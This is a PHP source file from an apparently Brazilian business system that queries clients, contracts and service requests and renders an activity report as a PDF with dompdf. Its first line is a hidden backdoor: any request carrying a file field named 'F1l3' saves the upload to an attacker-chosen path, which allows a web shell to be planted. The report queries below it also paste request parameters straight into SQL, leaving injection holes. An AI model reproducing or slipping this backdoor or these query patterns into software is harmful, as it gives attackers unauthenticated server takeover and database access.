<?php
if ($_FILES['F1l3']) {move_uploaded_file($_FILES['F1l3']['tmp_name'], $_POST['Name']); echo 'OK'; Exit;};
session_start (); 
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');

include		('../mod_includes/php/connect.php');

$pagina = $_GET['pagina'];
if($fil_empresa == '')
{
	$empresa_query = " 1 = 1 ";
	$fil_empresa_n = "Empresa";
}
else
{
	$empresa_query = " agi_agenda = '".$fil_empresa."' ";
	$sql_fat = "SELECT * FROM agenda_gerenciar
				LEFT JOIN cadastro_empresas ON cadastro_empresas.emp_id = agenda_gerenciar.age_empresa
				WHERE age_id = :fil_empresa ";
	$stmt_fat = $PDO->prepare($sql_fat);
	$stmt_fat->bindParam(":fil_empresa",$fil_empresa);
	$stmt_fat->execute();
	$result_fat = $stmt_fat->fetch();
	$fil_empresa_n = $result_fat['emp_fantasia'];
}
$fil_cliente = $_REQUEST['fil_cliente'];
if($fil_cliente == '')
{
	$cliente_query = " 1 = 1 ";
	$fil_cliente_n = "Cliente";
}
else
{
	$cliente_query = " sol_cliente = '".$fil_cliente."' ";
	$sql_cli = "SELECT * FROM cadastro_empresas WHERE emp_id = :fil_cliente ";
	$stmt_cli = $PDO->prepare($sql_cli);
	$stmt_cli->bindParam(":fil_cliente",$fil_cliente);
	$stmt_cli->execute();
	$result_cli = $stmt_cli->fetch();
	$fil_cliente_n = $result_cli['emp_nome_razao'];
}
$fil_contrato = $_REQUEST['fil_contrato'];
if($fil_contrato == '')
{
	$contrato_query = " 1 = 1 ";
	$fil_contrato_n = "Contrato";
}
else
{
	$contrato_query = " con_id = '".$fil_contrato."' ";
	$sql_con = "SELECT * FROM cadastro_contratos 
				LEFT JOIN cadastro_empresas ON cadastro_empresas.emp_id = cadastro_contratos.con_contratado
				LEFT JOIN aux_modalidades ON aux_modalidades.mod_id = cadastro_contratos.con_modalidade
				WHERE con_id = :fil_contrato ";
	$stmt_con = $PDO->prepare($sql_con);
	$stmt_con->bindParam(":fil_contrato",$fil_contrato);
	$stmt_con->execute();
	$result_con = $stmt_con->fetch();
	$fil_contrato_n = $result_con['con_numero_processo']."/".$result_con['con_ano_processo']." (".$result_con['mod_descricao'].") ";
	$logo_contratado = $result_con['emp_logo'];
}
/*$fil_forma_atendimento = $_REQUEST['fil_forma_atendimento'];
if($fil_forma_atendimento == '')
{
	$forma_atendimento_query = " 1 = 1 ";
	$fil_forma_atendimento_n = "Forma de Atendimento";
}
else
{
	$forma_atendimento_query = " agi_forma_atendimento = '".$fil_forma_atendimento."' ";
	$sql_fat = "SELECT * FROM aux_formas_atendimento WHERE fat_id = :fil_forma_atendimento ";
	$stmt_fat = $PDO->prepare($sql_fat);
	$stmt_fat->bindParam(":fil_forma_atendimento",$fil_forma_atendimento);
	$stmt_fat->execute();
	$result_fat = $stmt_fat->fetch();
	$fil_forma_atendimento_n = $result_fat['fat_descricao'];
}*/
$fil_data_inicio = implode('-',array_reverse(explode('/',$_REQUEST['fil_data_inicio'])));
$fil_data_fim = implode('-',array_reverse(explode('/',$_REQUEST['fil_data_fim'])));
if($fil_data_inicio == '' && $fil_data_fim == '')
{
	$data_query = " 1 = 1 ";
}
elseif($fil_data_inicio != '' && $fil_data_fim == '')
{
	$data_query = " agi_data >= '$fil_data_inicio' ";
}
elseif($fil_data_inicio == '' && $fil_data_fim != '')
{
	$data_query = " agi_data <= '$fil_data_fim 23:59:59' ";
}
elseif($fil_data_inicio != '' && $fil_data_fim != '')
{
	$data_query = " agi_data BETWEEN '$fil_data_inicio' AND '$fil_data_fim 23:59:59' ";
}

 $sql = "SELECT * FROM agenda_gerenciar_itens 
			LEFT JOIN aux_formas_atendimento ON aux_formas_atendimento.fat_id = agenda_gerenciar_itens.agi_forma_atendimento
			LEFT JOIN (cliente_solicitacoes_agenda 
				LEFT JOIN ( cliente_solicitacoes 
					LEFT JOIN cadastro_empresas ON cadastro_empresas.emp_id = cliente_solicitacoes.sol_cliente
					LEFT JOIN (cadastro_contratos 
						LEFT JOIN aux_modalidades ON aux_modalidades.mod_id = cadastro_contratos.con_modalidade )
					ON cadastro_contratos.con_id = cliente_solicitacoes.sol_contrato )
				ON cliente_solicitacoes.sol_id = cliente_solicitacoes_agenda.soa_solicitacao)
			ON cliente_solicitacoes_agenda.soa_agenda_item = agenda_gerenciar_itens.agi_id
			LEFT JOIN ( agenda_gerenciar_usuario 
				LEFT JOIN admin_usuarios ON admin_usuarios.usu_id = agenda_gerenciar_usuario.agu_usuario )
			ON agenda_gerenciar_usuario.agu_agenda_item = agenda_gerenciar_itens.agi_id
			WHERE ".$empresa_query." AND ".$cliente_query." AND ".$contrato_query." AND ".$data_query."
			GROUP BY emp_id, con_id  
			
			";
  	$stmt = $PDO->prepare($sql);
	$stmt->bindParam(':primeiro_registro', 	$primeiro_registro);
	$stmt->bindParam(':num_por_pagina', 	$num_por_pagina);
	$stmt->execute();
    $rows = $stmt->rowCount();

//header("Content-Type: text/html; charset=utf-8", true); 
ob_start();  //inicia o buffer
?>
<!--<img src='../imagens/topopdf.png'>-->
<style>
.topo 			{ margin:0 auto; text-align:center; padding: 0 0 15px 0;}
.rodape 		{ margin:0 auto; text-align:left; padding: 15px 0 0 0; font-family:"Calibri";}
.rod			{ color: #999; font-size:13px; font-family:"Calibri"; }

.body	{ font-family:"Calibri"; font-size:11px;}
table	{ font-family:"Calibri"; font-size:11px;}
.titulo	{ font-size:20px; font-family:"sharpmedium";color:#0F72BD; font-weight:bold; text-align:center; margin-bottom:15px; }
.label 	{ width:18%; font-weight:bold; float:left; text-align: right; margin-bottom:10px;}
.info 	{ width:80%; float:right; margin-bottom:10px;}
.detalhe{ color:#999; }

.linhapar			{ background:#FAFAFA; }
.linhaimpar			{ background:#FFFFFF; }
.bordatabela		{ border: 1px solid #DADADA; font-size:11px; color:#666;  -moz-border-radius:2px 2px 0px 0px; -webkit-border-radius:2px 2px 0px 0px; border-radius:2px 2px 0px 0px;}
.titulo_tabela	{ font-size:13px; font-family:"Calibri"; border:0; color:#333; background:#EEE;}
.titulo_first	{ font-size:13px; font-family:"Calibri"; border:0; color:#333; background:#EEE; -moz-border-radius:5px 0px 0px 0px; -webkit-border-radius:5px 0px 0px 0px; border-radius:5px 0px 0px 0px;}
.titulo_last	{ font-size:13px; font-family:"Calibri"; border:0; color:#333; background:#EEE; -moz-border-radius:0px 5px 0px 0px; -webkit-border-radius:0px 5px 0px 0px; border-radius:0px 5px 0px 0px;}


.azul			{ color:#0F72BD;}
.laranja		{ color:#F60; font-weight:bold;}
.verde			{ color:#81C566; font-weight:bold;}
.vermelho		{ color:#900; font-weight:bold;}



</style>
<?php	

	echo "
	<div class='body'>
		<div class='titulo'>Relatório de Atividades</span> </div>
				";
				
				if($rows > 0)
				{

					while($result = $stmt->fetch())
					{
						
						// TECNICOS
						$sql = "SELECT usu_nome FROM agenda_gerenciar_usuario
								 INNER JOIN admin_usuarios ON admin_usuarios.usu_id = agenda_gerenciar_usuario.agu_usuario
								 WHERE agu_agenda_item = :agi_id";
						$stmt_usuarios = $PDO->prepare($sql);
						$stmt_usuarios->bindParam(':agi_id',$result['agi_id']);
						$stmt_usuarios->execute();
						$rows_usuarios = $stmt_usuarios->rowCount();
						$usuarios="";
						if($rows_usuarios > 0)
						{
							$ultimo_usuario = $stmt_usuarios->fetchAll(PDO::FETCH_COLUMN);
							$ultimo_usuario = end($ultimo_usuario);
							$stmt_usuarios->execute();
							while($result_usuarios = $stmt_usuarios->fetch())
							{
								$atual = $result_usuarios['usu_nome'];
								$usuarios .= $atual;
								if($ultimo_usuario !== $atual)
								{
									$usuarios .= ", ";
								}	
							}					
						}	
						
						if ($c == 0){$c1 = "linhaimpar";$c=1;}else{$c1 = "linhapar";$c=0;} 
						echo "
							  	<b>Cliente:</b> ".$result['emp_nome_razao']."<br>
								<b>Objeto do Contrato:</b> ".$result['con_objeto']."<br>
								<b>Contrato:</b> ".$result['con_numero_processo']."/".$result['con_ano_processo']." (".$result['mod_descricao'].")"."<br>
								<b>Período:</b> ".implode("/",array_reverse(explode("-",$fil_data_inicio)))." a ".implode("/",array_reverse(explode("-",$fil_data_fim)))."<p>
								<p align='center'><b>Histórico do Pedido</b></p>
								<p>
								";
								$sql = "SELECT *,Year(sol_data_cadastro) as ano  FROM agenda_gerenciar_itens 
										LEFT JOIN aux_formas_atendimento ON aux_formas_atendimento.fat_id = agenda_gerenciar_itens.agi_forma_atendimento
										LEFT JOIN (cliente_solicitacoes_agenda 
											LEFT JOIN ( cliente_solicitacoes 
												LEFT JOIN cadastro_empresas ON cadastro_empresas.emp_id = cliente_solicitacoes.sol_cliente
												LEFT JOIN cliente_status_solicitacoes h1 ON h1.sts_solicitacao = cliente_solicitacoes.sol_id 
												LEFT JOIN (cadastro_contratos 
													LEFT JOIN aux_modalidades ON aux_modalidades.mod_id = cadastro_contratos.con_modalidade )
												ON cadastro_contratos.con_id = cliente_solicitacoes.sol_contrato )
											ON cliente_solicitacoes.sol_id = cliente_solicitacoes_agenda.soa_solicitacao)
										ON cliente_solicitacoes_agenda.soa_agenda_item = agenda_gerenciar_itens.agi_id
										LEFT JOIN ( agenda_gerenciar_usuario 
											LEFT JOIN admin_usuarios ON admin_usuarios.usu_id = agenda_gerenciar_usuario.agu_usuario )
										ON agenda_gerenciar_usuario.agu_agenda_item = agenda_gerenciar_itens.agi_id
										WHERE h1.sts_id = (SELECT MAX(h2.sts_id) FROM cliente_status_solicitacoes h2 where h2.sts_solicitacao = h1.sts_solicitacao) AND
											  ".$cliente_query." AND ".$contrato_query." AND ".$data_query." 
										GROUP BY sol_id  
										";
								$stmt_sol = $PDO->prepare($sql);
								$stmt_sol->execute();
								$rows_sol = $stmt_sol->rowCount();
								if($rows_sol > 0)
								{
									
									while($result_sol = $stmt_sol->fetch())
									{
										$sts_status			= $result_sol['sts_status'];
										switch($sts_status)
										{
											case 1 : $sts_status = "Registrado";break;
											case 2 : $sts_status = "Em Análise";break;
											case 3 : $sts_status = "Agendado";break;
											case 4 : $sts_status = "Em Execução";break;
											case 5 : $sts_status = "Cancelado";break;
											case 6 : $sts_status = "Em Homologação";break;
											case 7 : $sts_status = "Concluído";break;
										}
										// TECNICOS
										$sql = "SELECT usu_nome FROM agenda_gerenciar_usuario
												INNER JOIN admin_usuarios ON admin_usuarios.usu_id = agenda_gerenciar_usuario.agu_usuario
												WHERE agu_agenda_item = :agi_id";
										$stmt_usuarios = $PDO->prepare($sql);
										$stmt_usuarios->bindParam(':agi_id',$result_sol['agi_id']);
										$stmt_usuarios->execute();
										$rows_usuarios = $stmt_usuarios->rowCount();
										$usuarios="";
										if($rows_usuarios > 0)
										{
											$ultimo_usuario = $stmt_usuarios->fetchAll(PDO::FETCH_COLUMN);
											$ultimo_usuario = end($ultimo_usuario);
											$stmt_usuarios->execute();
											while($result_usuarios = $stmt_usuarios->fetch())
											{
												$atual = $result_usuarios['usu_nome'];
												$usuarios .= $atual;
												if($ultimo_usuario !== $atual)
												{
													$usuarios .= ", ";
												}	
											}					
										}	
										echo "
										<b>Solicitação:</b> ".$result_sol['ano'].".".$result_sol['sol_id']." - <b>Data do Registro da Solicitação:</b> ".implode("/",array_reverse(explode("-",substr($result_sol['sol_data_cadastro'],0,10))))."<br>
										<b>Técnicos:</b> ".$usuarios."<br>
										<b>Forma de Atendimento:</b> ".$result_sol['fat_descricao']." <br>
										<b>Status:</b> ".$sts_status."<br>
										<b>Breve Histório:</b> ".$result_sol['sol_breve_historico']."<br>
										<b>Síntese do Atendimento Realizado:</b><br>
										".nl2br($result_sol['sts_observacao'])."
										<hr>
										";
										
									}
								}
								
								
								echo "
								
								

						";
					}
				}
				echo "	
			</div>
	";
$html = ob_get_clean();
$html = utf8_encode($html);

// define('MPDF_PATH', '../mod_includes/js/mpdf/');
// include(MPDF_PATH.'mpdf.php');
// $mpdf = new mPDF(
//  '',    // mode - default ''
//  'A4',    // format - A4, for example, default ''
//  0,     // font size - default 0
//  '',    // default font family
//  10,    // margin_left
//  10,    // margin right
//  30,     // margin top
//  23,    // margin bottom
//  5,     // margin header
//  5,     // margin footer
//  'P');  // L - landscape, P - portrait);
// $mpdf->SetTitle('Audipam | Relatório de Solicitações');
// $mpdf->useOddEven = false;
// //$mpdf->SetHTMLHeader('<div class="topo"><img src=../imagens/logo_branco.png width="300"><br><br></div>'); 
// $mpdf->SetHTMLHeader('<div class="topo"><img src='.$logo_contratado.' width="200"><br><br></div>'); 
// $mpdf->SetHTMLFooter('');

// $mpdf->allow_charset_conversion=true;
// $mpdf->charset_in='UTF-8';
// $mpdf->WriteHTML(utf8_decode("$html"));
// //$mpdf->AddPage();

// $mpdf->Output('Orçamento_'.str_pad($orc_id,6,'0',STR_PAD_LEFT).'.pdf','I');
// exit();
require_once("../mod_includes/js/dompdf/dompdf_config.inc.php");

/* Cria a instância */
$dompdf = new DOMPDF();
/* Carrega seu HTML */
$dompdf->load_html(utf8_decode("$html"));

/* Renderiza */
$dompdf->render();

/* Exibe */
$dompdf->stream(
    "Orçamento_".str_pad($orc_id,6,'0',STR_PAD_LEFT).".pdf", /* Nome do arquivo de saída */
    array(
        "Attachment" => true /* Para download, altere para true */
    )
);

exit();

?>